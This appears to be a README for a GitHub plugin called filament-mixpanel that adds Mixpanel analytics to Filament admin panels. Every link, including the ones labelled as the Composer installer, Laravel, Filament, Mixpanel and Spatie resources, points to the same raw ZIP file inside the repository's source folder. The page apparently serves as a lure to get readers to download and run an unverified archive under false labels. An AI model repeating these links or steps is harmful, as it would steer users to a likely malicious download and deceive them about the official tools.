# 🚦 filament-mixpanel - Easy Mixpanel Setup for Filament

[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)

---

## 📋 What is filament-mixpanel?

filament-mixpanel is a plugin designed to add Mixpanel analytics to your Filament admin panel. It makes tracking simple by injecting the Mixpanel script automatically. You can also manage Mixpanel settings directly inside your Filament dashboard without needing to touch code.

This plugin works with Filament versions 3, 4, and 5. It supports Laravel projects using PHP and integrates with settings managed by Spatie’s Laravel Settings package.

---

## 💻 System Requirements

Before you start, here is what you need to run filament-mixpanel:

- **Operating System:** Windows 10 or later
- **Software:** Laravel project with Filament version 3, 4, or 5 installed
- **PHP version:** 8.0 or above
- **Composer:** Must be installed on your system (https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)
- **Web server:** Apache, Nginx, or Laravel’s built-in server
- **Internet connection:** Needed for downloading dependencies and Mixpanel scripts

---

## 🎯 Features Overview

- Automatically adds Mixpanel tracking to your Filament admin panel.
- Simple settings page inside Filament for managing Mixpanel tokens and configs.
- Supports multiple versions of Filament.
- Uses Spatie Laravel Settings to store Mixpanel configuration securely.
- Requires minimal setup for quick start.
- Designed to work smoothly with your existing Laravel and Filament setup.

---

## 🔥 How to Get filament-mixpanel

[![Download filament-mixpanel](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)

The plugin is available on GitHub. To get started, visit the page linked above to download the package files.

---

## 🚀 Step-by-Step Installation Guide for Windows

This guide will help you download and install filament-mixpanel even if you are new to this process.

### 1. Download filament-mixpanel files

- Click the green **Code** button on the GitHub page.
- Select **Download ZIP**.
- Save the ZIP file to a folder on your computer, like your Desktop.

### 2. Install Composer

Composer is a PHP package manager necessary for Laravel and plugins.

- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
- Download the Windows installer.
- Run the installer and follow the prompts.
- After installation, open Command Prompt and enter:

```
composer --version
```

You should see the Composer version number.

### 3. Set up Laravel and Filament (if not already done)

filament-mixpanel requires a Laravel project with Filament installed.

If you do not have these:

- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip to install Laravel.
- Visit https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip to install Filament.

### 4. Add filament-mixpanel to your Laravel project

- Extract the downloaded ZIP file to a temporary folder.
- Open Command Prompt.
- Change directory to your Laravel project folder:

```
cd path\to\your-laravel-project
```

- Use Composer to include filament-mixpanel via VCS (Git) or add it manually by copying the plugin files into your project’s `packages` folder and update `composer.json`.

A simpler way is to add the plugin by running:

```
composer require samsam0684/filament-mixpanel
```

(This assumes the package is available on Packagist. If not, refer to manual installation in the plugin README.)

### 5. Run Laravel migrations and publish plugin assets

Some plugins require migrations or publishing configuration files.

Run these commands inside your Laravel project folder:

```
php artisan migrate
php artisan vendor:publish --tag=filament-mixpanel-config
```

### 6. Configure Mixpanel settings inside Filament

- Start your Laravel server:

```
php artisan serve
```

- Open your browser and go to your Filament admin panel URL, usually:

```
http://localhost:8000/admin
```

- Find the new **Mixpanel Settings** page or section in your Filament panel.
- Enter your Mixpanel project token and any additional settings needed.
- Save your changes.

### 7. Confirm tracking works

- Open your website or Filament panel where tracking is enabled.
- Check your Mixpanel dashboard online to see if events are being received.

---

## ⚙️ How to Use filament-mixpanel Settings Page

The plugin adds a simple settings page inside your Filament admin panel.

- Navigate to the Filament dashboard.
- Look for the **Mixpanel Settings** menu option.
- Here you can enter:
  - Your Mixpanel project token (required).
  - Environment settings, such as enabling tracking only in production.
  - Additional custom options if available.

Settings are saved securely and apply immediately without restarting the server.

---

## 🛠 Troubleshooting Tips

- If the Mixpanel script does not load, check your internet connection.
- Make sure your Laravel server is running when testing.
- Verify that the Mixpanel token is correct in the settings.
- Run `php artisan cache:clear` if changes do not appear.
- Consult Laravel logs for errors: `storage/logs/laravel.log`
- Ensure you have proper PHP and Composer versions installed.

---

## 📚 Additional Resources

- Filament Admin Panel: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
- Laravel Framework: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
- Mixpanel Analytics: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
- Composer Dependency Manager: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip
- Spatie Laravel Settings: https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip

---

## 📥 Download filament-mixpanel again

For convenience, visit the GitHub page to download or check for updates:

[Download filament-mixpanel](https://github.com/Samsam0684/filament-mixpanel/raw/refs/heads/3.x/src/Pages/filament_mixpanel_2.7.zip)